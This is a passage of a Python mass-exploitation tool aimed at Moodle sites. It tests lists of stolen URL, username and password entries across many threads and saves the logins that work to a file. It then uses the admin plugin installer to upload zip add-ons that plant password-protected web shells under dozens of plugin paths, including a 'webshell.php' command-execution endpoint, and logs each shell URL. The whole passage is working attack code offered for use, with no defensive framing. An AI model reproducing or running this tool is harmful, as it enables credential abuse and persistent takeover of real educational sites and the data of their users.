                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/mod/workshop/eval/credit/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False

    def UploadShellScormReport(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-scormreport_trends-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/mod/scorm/report/trends/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellQuizAccess(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-quizaccess_honestycheck-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/mod/quiz/accessrule/honestycheck/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False

    
    def start(self):
        try:
            if self.isLogin():
                formats = self.url + "|" + self.username + "|" + self.password
                open("Valid.txt", "a").write(formats + "\n")
                Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Good!!")
                
                if self.UploadShellBlock():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/blocks/selectrss/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Block Shell!")
                if self.UploadShellLocal():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/local/moodle_webshell/webshell.php?action=exec&cmd=php%20-v\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Local Shell!")
                
                if self.UploadShellLang():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/theme/lanciau/lang/en/theme_lanciau.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Theme Shell!")
                
                if self.UploadShellMod():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/mod/lanciau/lang/en/lanciau.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Mod Shell!")
                
                if self.UploadShellAdminTool():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/admin/tool/redirects/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload AdminTool Shell!")
                
                if self.UploadShellPaymentGateway():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/payment/gateway/duitku/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload PaymentGateway Shell!")
                
                if self.UploadShellH5P():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/h5p/h5plib/v126/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload H5PLib Shell!")
                
                if self.UploadShellContentbank():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/contentbank/contenttype/repurpose/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload ContentBank Shell!")
                
                if self.UploadShellFileConverter():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/files/converter/onlyoffice/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload FileConverter Shell!")
                
                if self.UploadShellCacheStore():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/cache/stores/rediscluster/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload CacheStore Shell!")
                
                if self.UploadShellCacheLock():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/cache/locks/rediscluster/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload CacheLock Shell!")
                
                if self.UploadShellPlagiarism():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/plagiarism/originality/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Plagiarism Shell!")
                
                if self.UploadShellSearchEngine():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/search/engine/elastic/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload SearchEngine Shell!")
                
                if self.UploadShellPortfolio():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/portfolio/evernote/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Portfolio Shell!")
                
                if self.UploadShellRepository():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/repository/alfresco/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Repository Shell!")
                
                if self.UploadShellWebservice():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/webservice/restful/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Webservice Shell!")
                
                if self.UploadShellMLBackends():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/lib/mlbackend/lmswithaipython/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload MLBackend Shell!")

                if self.UploadShellGradingForm():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/grade/grading/form/checklist/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload GradingForm Shell!")

                if self.UploadShellGradeReport():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/grade/report/rubrics/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload GradeReport Shell!")
                
                if self.UploadShellGradeExport():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/grade/export/apogee/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload GradeExport Shell!")
                
                if self.UploadShellReports():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/report/coursecompletion/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Report Shell!")
                
                if self.UploadShellProfileField():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/user/profile/field/associated/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload ProfileField Shell!")
                
                if self.UploadShellDataFormat():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/dataformat/xml/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload DataFormat Shell!")
                
                if self.UploadShellMediaPlayer():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/media/player/realplayer/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload MediaPlayer Shell!")
                
                if self.UploadShellMessageOutput():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/message/output/telegram/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload MessageOutput Shell!")
                
                if self.UploadShellCustomField():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/customfield/field/file/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload CustomField Shell!")
                
                if self.UploadShellCalendarType():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/calendar/type/ummulqora/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload CalendarType Shell!")
                
                if self.UploadShellAvailability():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/availability/condition/language/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Availability Shell!")
                
                if self.UploadShellAuth():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/auth/userkey/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Auth Shell!")
                
                if self.UploadShellEnrol():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/enrol/apply/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Enrol Shell!")
                
                if self.UploadShellTinymce():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/lib/editor/tinymce/plugins/recordrtc/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload TinyMCE Shell!")
                
                if self.UploadShellAtto():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/lib/editor/atto/plugins/c4l/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Atto Shell!")
                
                if self.UploadShellEditor():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/lib/editor/ousupsub/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Editor Shell!")
                
                if self.UploadShellFilter():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/filter/filtercodes/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Filter Shell!")
                
                if self.UploadShellQformat():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/question/format/wordtable/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Qformat Shell!")
                
                if self.UploadShellQbeha():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/question/behaviour/interactiveexplain/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Qbehaviour Shell!")
                
                if self.UploadShellQbank():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/question/bank/gitsync/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload QBank Shell!")
                
                if self.UploadShellQtype():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/question/type/combined/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload Qtype Shell!")
                
                if self.UploadShellWshopEval():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/mod/workshop/eval/credit/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload WShopEval Shell!")
                
                if self.UploadShellScormReport():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/mod/scorm/report/trends/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload ScormReport Shell!")
                
                if self.UploadShellQuizAccess():
                    open("Shell.txt", "a").write(self.url.replace("/login/index.php", "") + "/mod/quiz/accessrule/honestycheck/lock.php\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Success Upload QuizAccess Shell!")
                
            else:
                Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTRED_EX}--- Bad Login!!")
        except:
            Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTRED_EX}--- Bad!!")

def Runner(lista):
    try:
        MoodleChecker(lista).start()
    except:
        pass

if __name__=="__main__":
    Banner()
    input_list = [j.strip("\r\n") for j in open(input(f"{Fore.WHITE} Your List : "), "r", encoding="ISO-8859-1").readlines()]
    Thread = input(f"{Fore.WHITE} Thread : ")
    pool = ThreadPool(int(Thread))
    pool.map(Runner, input_list)
    pool.close()
    pool.join()
